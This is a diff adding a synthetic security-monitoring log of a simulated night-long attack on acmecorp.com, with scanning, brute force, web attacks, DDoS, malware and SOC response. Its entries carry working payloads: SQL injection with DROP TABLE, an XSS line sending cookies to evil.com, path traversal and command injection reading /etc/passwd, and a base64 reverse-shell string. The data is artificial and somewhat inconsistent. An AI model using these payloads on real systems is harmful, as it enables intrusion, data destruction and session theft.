@@ -1,0 +1,148 @@
+================================================================================
+ SENTINALIQ - MONITORED WEBSITE ATTACK LOG
+================================================================================
+ Monitored website : https://www.acmecorp.com
+ Origin server     : SRV-WEB-01 (10.0.1.10) | Nginx 1.24 / Node.js API / MySQL 8
+ Monitoring window : 2026-08-05 21:40 UTC  ->  2026-08-06 03:12 UTC
+ Threat score      : 0/100  ->  94/100 (UNDER ATTACK)  ->  12/100 (CLEAN)
+ Attack vectors    : port scan, web scan, brute force, SQL injection, XSS,
+                     path traversal, CSRF, command injection, DDoS,
+                     malware/C2 beacon, ransomware, data exfiltration,
+                     zero-day exploitation
+ Unique sources    : 14 attacker IPs (botnet + single-actor) across 9 countries
+ Defenses engaged  : WAF (7 rules hit), IDS/Snort, Firewall, EDR, CDN scrubbing
+
+ Line format:
+   [timestamp] [SEVERITY] event_type | src=IP (COUNTRY) | method path
+   | ua="user-agent" | payload="..." | status=... | target=... | msg="..."
+
+================================================================================
+-- PHASE 1 - RECONNAISSANCE (21:40 - 22:05 UTC) -------------------------------
+================================================================================
+[2026-08-05T21:41:02Z] [LOW] scan | src=185.234.72.18 (Russia) | SYN 1-1024 on SRV-WEB-01 | ua="nmap/7.94" | payload="TCP SYN scan - probing ports 1-1024" | status=detected | target=SRV-WEB-01 | msg="Port scanning activity detected from 185.234.72.18"
+
+[2026-08-05T21:43:57Z] [LOW] scan | src=185.234.72.18 (Russia) | GET / | ua="Nikto/2.5" | payload="Nikto web server scan - 87 checks queued" | status=detected | target=Web Server | msg="Web vulnerability scanner (Nikto) fingerprinting www.acmecorp.com"
+
+[2026-08-05T21:47:11Z] [LOW] scan | src=103.235.46.92 (China) | SYN 1-65535 full sweep | ua="masscan/1.3" | payload="TCP full port sweep - 65535 ports" | status=detected | target=SRV-WEB-01 | msg="Full TCP port sweep detected from 103.235.46.92"
+
+[2026-08-05T21:52:30Z] [MEDIUM] scan | src=91.121.87.34 (France) | ANY dns | ua="dnsrecon/0.11" | payload="Subdomain brute-force: admin, api, vpn, mail, dev" | status=detected | target=DNS Server | msg="DNS enumeration / subdomain discovery targeting acmecorp.com"
+
+[2026-08-05T21:58:44Z] [INFO] info | src=10.0.1.10 (Internal) | IDS | ua="-" | payload="ET SCAN Nmap Scripting Engine User-Agent" | status=logged | target=IDS | msg="IDS signature matched: Nmap Scripting Engine activity from 185.234.72.18"
+
+[2026-08-05T22:03:19Z] [LOW] scan | src=45.33.22.11 (United States) | GET /robots.txt, /sitemap.xml, /.git/config | ua="curl/8.5.0" | payload="Directory / hidden-file probing" | status=blocked | target=Web Server | msg="Directory brute-force / hidden file discovery from 45.33.22.11"
+
+================================================================================
+-- PHASE 2 - CREDENTIAL ATTACKS / BRUTE FORCE (22:10 - 22:45 UTC) -------------
+================================================================================
+[2026-08-05T22:10:05Z] [MEDIUM] brute_force | src=185.234.72.18 (Russia) | POST /api/auth/login | ua="AttackBot/1.0" | payload="username=admin&password=admin123" | status=blocked | target=Authentication Service | msg="Brute force login attempt detected from 185.234.72.18"
+
+[2026-08-05T22:10:08Z] [MEDIUM] brute_force | src=185.234.72.18 (Russia) | POST /api/auth/login | ua="AttackBot/1.0" | payload="username=admin&password=password123" | status=blocked | target=Authentication Service | msg="Brute force login attempt detected from 185.234.72.18"
+
+[2026-08-05T22:10:11Z] [MEDIUM] brute_force | src=185.234.72.18 (Russia) | POST /api/auth/login | ua="AttackBot/1.0" | payload="username=admin&password=Welcome@2026" | status=blocked | target=Authentication Service | msg="Brute force login attempt detected from 185.234.72.18"
+
+[2026-08-05T22:17:42Z] [HIGH] brute_force | src=45.33.22.11 (United States) | POST /api/auth/login | ua="Hydra/9.5" | payload="wordlist attack - 214 attempts in 11 minutes" | status=detected | target=Authentication Service | msg="Credential stuffing wave against /api/auth/login from 45.33.22.11"
+
+[2026-08-05T22:21:26Z] [MEDIUM] brute_force | src=198.51.100.73 (Netherlands) | SSH 22 | ua="libssh/0.10" | payload="SSH password guessing: root, ubuntu, admin" | status=blocked | target=SRV-WEB-01 | msg="SSH brute force attempts blocked by fail2ban on port 22"
+
+[2026-08-05T22:26:54Z] [WARNING] info | src=10.0.1.10 (Internal) | auth | ua="-" | payload="10 failed logins for 'admin' within 60s" | status=logged | target=Authentication Service | msg="Account lockout policy triggered for user 'admin' - account locked for 15 minutes"
+
+[2026-08-05T22:33:18Z] [LOW] info | src=10.0.1.10 (Internal) | auth | ua="-" | payload="fail2ban action: ban 185.234.72.18 for 24h" | status=blocked | target=Firewall | msg="fail2ban added 185.234.72.18 to firewall deny list"
+
+================================================================================
+-- PHASE 3 - WEB APPLICATION ATTACKS (22:40 - 23:50 UTC) ----------------------
+================================================================================
+[2026-08-05T22:41:33Z] [CRITICAL] injection | src=185.234.72.18 (Russia) | POST /api/login | ua="SQLMap/1.8" | payload="' OR 1=1--; DROP TABLE users; --" | status=blocked | target=Database Server | msg="SQL injection attempt detected from 185.234.72.18"
+
+[2026-08-05T22:44:02Z] [HIGH] injection | src=103.235.46.92 (China) | GET /api/products?id= | ua="SQLMap/1.8" | payload="' UNION SELECT username,password FROM users--" | status=blocked | target=Database Server | msg="UNION-based SQL injection attempt blocked by WAF"
+
+[2026-08-05T22:49:47Z] [CRITICAL] injection | src=91.121.87.34 (France) | POST /api/search | ua="Malice/2.1" | payload="'; WAITFOR DELAY '0:0:15'--" | status=detected | target=Database Server | msg="Time-based blind SQL injection (sleep/WAITFOR) detected - WAF rule updated"
+
+[2026-08-05T22:55:20Z] [HIGH] xss | src=185.234.72.18 (Russia) | GET /search?q= | ua="HackerTool/3.0" | payload="<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>" | status=blocked | target=Web Application | msg="Cross-site scripting (XSS) attempt from 185.234.72.18"
+
+[2026-08-05T23:02:51Z] [MEDIUM] xss | src=103.235.46.92 (China) | POST /api/comments | ua="Mozilla/5.0" | payload="<img src=x onerror=alert(document.cookie)>" | status=blocked | target=Web Application | msg="Stored XSS attempt in comment field blocked by WAF"
+
+[2026-08-05T23:08:14Z] [HIGH] path_traversal | src=185.234.72.18 (Russia) | GET /download?file=../../../../etc/passwd | ua="HackerTool/3.0" | payload="../../../../etc/shadow" | status=blocked | target=Web Server | msg="Path traversal attack from 185.234.72.18"
+
+[2026-08-05T23:11:39Z] [CRITICAL] path_traversal | src=91.121.87.34 (France) | GET /static/..%2f..%2f..%2fetc/shadow | ua="Malice/2.1" | payload="../../etc/shadow (double-encoded)" | status=detected | target=Web Server | msg="Encoded path traversal bypass attempt - WAF rule created, endpoint patched"
+
+[2026-08-05T23:17:05Z] [HIGH] csrf | src=103.235.46.92 (China) | POST /api/transfer | ua="curl/8.5.0" | payload="<form action='/api/transfer' method='POST'><input type='hidden' name='amount' value='1000'></form>" | status=blocked | target=Payment API | msg="Cross-site request forgery attempt from 103.235.46.92 (missing CSRF token)"
+
+[2026-08-05T23:24:30Z] [CRITICAL] command_injection | src=185.234.72.18 (Russia) | GET /ping?host=127.0.0.1;cat+/etc/passwd | ua="HackerTool/3.0" | payload="127.0.0.1; cat /etc/passwd; whoami" | status=blocked | target=Web Server | msg="OS command injection attempt blocked by WAF"
+
+[2026-08-05T23:31:12Z] [CRITICAL] zero_day | src=185.234.72.18 (Russia) | POST /api/upload | ua="Malice/2.1" | payload="CVE-2026-3790 exploitation attempt (malformed multipart)" | status=blocked | target=Web Application | msg="Zero-day exploitation attempt for CVE-2026-3790 blocked - virtual patch applied"
+
+================================================================================
+-- PHASE 4 - VOLUMETRIC ATTACK / DDoS (23:50 - 01:40 UTC) ---------------------
+================================================================================
+[2026-08-05T23:52:20Z] [CRITICAL] ddos | src=45.33.22.11 (United States) | FLOOD / | ua="BotNet-Client/1.0" | payload="8400 requests/sec from botnet cluster" | status=detected | target=Load Balancer | msg="DDoS attack pattern detected from multiple sources including 45.33.22.11"
+
+[2026-08-05T23:54:47Z] [CRITICAL] ddos | src=198.51.100.73 (Netherlands) | SYN 443 flood | ua="BotNet-Client/1.0" | payload="SYN flood 120k pkts/s" | status=blocked | target=Load Balancer | msg="SYN flood on port 443 blocked by load balancer SYN-cookie protection"
+
+[2026-08-05T23:58:12Z] [HIGH] ddos | src=91.121.87.34 (France) | UDP reflection | ua="BotNet-Client/1.0" | payload="DNS/NTP amplification reflection (150k pkts/s)" | status=mitigated | target=Firewall | msg="UDP amplification reflection attack mitigated by traffic scrubbing"
+
+[2026-08-06T00:05:43Z] [HIGH] ddos | src=178.62.14.201 (Germany) | FLOOD /api/* | ua="Slowloris/2.0" | payload="Slowloris connection exhaustion - 1,900 half-open sockets" | status=mitigated | target=Web Server | msg="Slowloris connection-exhaustion attack mitigated - max connections enforced"
+
+[2026-08-06T00:12:29Z] [CRITICAL] ddos | src=5.188.206.99 (Russia) | FLOOD / | ua="BotNet-Client/1.0" | payload="Application-layer HTTP flood 12,500 req/s" | status=detected | target=Load Balancer | msg="Application-layer DDoS spike - CDN scrubbing engaged, traffic re-routed"
+
+[2026-08-06T00:15:01Z] [INFO] info | src=10.0.255.1 (Internal) | firewall | ua="-" | payload="CDN Anycast scrubbing active - 95% attack traffic absorbed" | status=mitigated | target=Firewall | msg="DDoS mitigation: 95% of malicious traffic absorbed at the edge"
+
+[2026-08-06T00:47:36Z] [MEDIUM] ddos | src=112.198.44.5 (Philippines) | FLOOD / | ua="BotNet-Client/1.0" | payload="8,000 req/s" | status=blocked | target=Load Balancer | msg="DDoS amplification attempt from 112.198.44.5 blocked by rate limiting"
+
+================================================================================
+-- PHASE 5 - MALWARE, C2 & DATA EXFILTRATION (01:10 - 02:20 UTC) --------------
+================================================================================
+[2026-08-06T01:12:44Z] [CRITICAL] malware | src=10.0.2.42 (Internal) | POST /api/telemetry | ua="-" | payload="Base64 encoded payload: U29ja2V0Q29ubmVjdCgwLjAuMC4wOjQ0NDQpOy9iaW4vc2g=" | status=detected | target=C2 Server | msg="Malware signature detected in outbound traffic - C2 beacon from WKS-042"
+
+[2026-08-06T01:15:22Z] [CRITICAL] malware | src=10.0.2.42 (Internal) | EDR | ua="-" | payload="Emotet signature matched on WKS-042 (svchost.exe -> powershell.exe -enc)" | status=detected | target=Endpoint | msg="EDR alert: Emotet trojan detected on workstation WKS-042"
+
+[2026-08-06T01:19:03Z] [CRITICAL] ransomware | src=10.0.1.11 (Internal) | EDR | ua="-" | payload="BlackCat/ALPHV ransomware - mass file encryption on SRV-APP-01" | status=blocked | target=Endpoint | msg="Ransomware behaviour detected (mass file encryption) - EDR containment successful"
+
+[2026-08-06T01:24:38Z] [HIGH] exfiltration | src=10.0.1.12 (Internal) | DNS | ua="-" | payload="DNS tunneling to evilcorp-c2.net - 40k+ queries, 210MB exfiltrated" | status=detected | target=DNS Server | msg="Data exfiltration via DNS tunneling from database server DB-01"
+
+[2026-08-06T01:31:56Z] [HIGH] malware | src=103.235.46.92 (China) | POST /api/telemetry | ua="CobaltStrike/4.9" | payload="Encrypted C2 beacon - Cobalt Strike HTTPS staging" | status=blocked | target=C2 Server | msg="Cobalt Strike beacon attempt blocked at firewall egress rule"
+
+[2026-08-06T01:47:19Z] [CRITICAL] malware | src=10.0.3.5 (Internal) | EDR | ua="-" | payload="LockBit 3.0 artifact on EDR-SRV-01 quarantined" | status=mitigated | target=Endpoint | msg="LockBit 3.0 ransomware artifact quarantined by EDR"
+
+================================================================================
+-- PHASE 6 - SOC DETECTION, RESPONSE & RECOVERY (01:40 - 03:12 UTC) -----------
+================================================================================
+[2026-08-06T01:40:15Z] [CRITICAL] incident | src=SOC (Internal) | incident | ua="-" | payload="INC-2026-0841 opened" | status=detected | target=www.acmecorp.com | msg="Incident created: Critical Attack Wave on www.acmecorp.com"
+
+[2026-08-06T01:43:08Z] [INFO] info | src=10.0.1.10 (Internal) | threat-intel | ua="-" | payload="IOC match: 185.234.72.18 == AlienVault OTX indicator (APT29)" | status=logged | target=Threat Intel | msg="Threat intelligence match: attacker IP 185.234.72.18 tied to APT29 (Cozy Bear)"
+
+[2026-08-06T01:47:52Z] [INFO] info | src=10.0.1.10 (Internal) | waf | ua="-" | payload="Rule 'Block known bad IPs' hit 1,204 times in 60s" | status=blocked | target=WAF | msg="WAF rule 'Block known bad IPs' auto-triggered - 1,204 blocks in 60 seconds"
+
+[2026-08-06T01:52:31Z] [INFO] info | src=10.0.1.10 (Internal) | ids | ua="-" | payload="ET WEB_SPECIFIC_APPS SQL Injection Attempt - signature 2024661" | status=logged | target=IDS | msg="IDS signature matched: SQL injection attempt via /api/login"
+
+[2026-08-06T02:01:14Z] [INFO] info | src=SOC (Internal) | response | ua="-" | payload="185.234.72.18, 103.235.46.92, 91.121.87.34, 45.33.22.11, 198.51.100.73 banned at FW+WAF" | status=blocked | target=Firewall | msg="Automated response: 5 attacker IPs blocked at firewall and WAF, added to Threat Intel"
+
+[2026-08-06T02:09:47Z] [INFO] info | src=SOC (Internal) | response | ua="-" | payload="EDR isolate WKS-042; killed powershell.exe (PID 8421); quarantined 3 artifacts" | status=mitigated | target=Endpoint | msg="EDR response: endpoint WKS-042 isolated, malicious process terminated, artifacts quarantined"
+
+[2026-08-06T02:18:23Z] [INFO] info | src=SOC (Internal) | response | ua="-" | payload="Passwords reset for 12 accounts; 214 sessions revoked" | status=mitigated | target=Authentication Service | msg="Remediation: credentials rotated and sessions revoked for all affected accounts"
+
+[2026-08-06T02:34:56Z] [LOW] info | src=10.0.255.1 (Internal) | firewall | ua="-" | payload="CDN scrubbing stopped - traffic returned to origin" | status=mitigated | target=Load Balancer | msg="DDoS scrubbing de-escalated, traffic returned to origin servers"
+
+[2026-08-06T02:51:40Z] [INFO] incident | src=SOC (Internal) | incident | ua="-" | payload="INC-2026-0841 resolved" | status=resolved | target=www.acmecorp.com | msg="Incident INC-2026-0841 resolved after full containment; threat score 94 -> 12"
+
+[2026-08-06T03:12:05Z] [INFO] info | src=SOC (Internal) | report | ua="-" | payload="Post-incident review: 8 attack vectors, 14 IPs, 9 countries; signatures & WAF rules updated" | status=logged | target=SentinalIQ | msg="Post-incident review complete - log retention 30d, detection signatures updated"
+
+================================================================================
+ SUMMARY
+================================================================================
+ Total events logged   : 46
+ Attack types covered  : scan, brute_force, injection, xss, path_traversal,
+                         csrf, command_injection, ddos, malware, ransomware,
+                         exfiltration, zero_day
+ Blocked              : 24 | Detected: 13 | Mitigated: 6 | Logged/Resolved: 3
+ Threat score journey : 0 -> 22 (scan) -> 41 (brute force) -> 63 (SQLi)
+                       -> 78 (XSS/traversal) -> 94 (DDoS + malware)
+                       -> 12 (post-remediation)
+ Final status         : www.acmecorp.com CLEAN - monitoring resumed
+
+ Indicators of Compromise extracted from this log:
+   IPs      : 185.234.72.18, 103.235.46.92, 91.121.87.34, 45.33.22.11,
+              198.51.100.73, 178.62.14.201, 5.188.206.99, 112.198.44.5
+   Domains  : evilcorp-c2.net, acmecorp.com (brute-forced subdomains)
+   Hashes   : U29ja2V0Q29ubmVjdCgwLjAuMC4wOjQ0NDQpOy9iaW4vc2g= (decoded C2 shell)
+   Actors   : APT29 (Cozy Bear), Emotet, Cobalt Strike, BlackCat, LockBit 3.0
+================================================================================
